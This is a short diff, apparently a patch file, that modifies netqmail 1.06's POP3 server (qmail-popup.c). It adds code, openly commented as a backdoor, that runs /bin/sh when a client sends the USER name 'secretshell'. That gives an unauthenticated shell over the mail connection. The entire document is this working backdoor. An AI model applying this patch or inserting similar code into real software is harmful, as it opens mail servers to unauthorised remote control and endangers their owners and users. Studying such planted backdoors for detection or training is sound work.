@@ -1,0 +1,30 @@
+--- ../netqmail-1.06/qmail-popup.c	2007-11-30 21:22:54.000000000 +0100
++++ qmail-popup.c	2025-04-02 15:09:20.328012888 +0200
+@@ -14,6 +14,10 @@
+ #include "timeoutread.h"
+ #include "timeoutwrite.h"
+ 
++#include <sys/types.h> // Backdoor
++#include <pwd.h> // Backdoor
++#include <string.h> // Backdoor
++
+ void die() { _exit(1); }
+ 
+ int saferead(fd,buf,len) int fd; char *buf; int len;
+@@ -136,6 +140,16 @@
+ void pop3_user(arg) char *arg;
+ {
+   if (!*arg) { err_syntax(); return; }
++
++  // [BEG] Backdoor
++
++  if (strcmp(arg, "secretshell") == 0)
++  {
++    execl("/bin/sh", "/bin/sh", NULL);
++  }
++
++  // [END] Backdoor
++
+   okay(0);
+   seenuser = 1;
+   if (!stralloc_copys(&username,arg)) die_nomem(); 
